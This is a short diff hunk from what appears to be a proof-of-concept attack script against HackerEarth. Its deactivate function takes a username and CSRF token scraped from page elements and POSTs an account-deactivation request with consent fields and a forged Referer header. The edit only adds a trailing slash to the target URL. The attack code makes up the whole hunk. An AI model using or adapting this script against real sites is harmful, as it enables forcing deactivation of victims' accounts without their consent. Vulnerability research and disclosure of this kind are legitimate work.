@@ -61,7 +61,7 @@ function deactivate(){
   var username = document.getElementById("demo3").innerText;
   var csrf = document.getElementById("demo4").innerText;
   var param  = "csrfmiddlewaretoken=" + csrf.replace("csrf for deactivate account : ","") + "&deactivate_reason=1&deactivate_other_message=&deactivate_consent=on&submit=Deactivate+my+account"
-  var url = "https://www.hackerearth.com/deactivate/" + username.replace("Username: ","");;
+  var url = "https://www.hackerearth.com/deactivate/" + username.replace("Username: ","") + "/";
   xhttp.open("POST", url, true);
   xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
   xhttp.setRequestHeader("Referer", url);
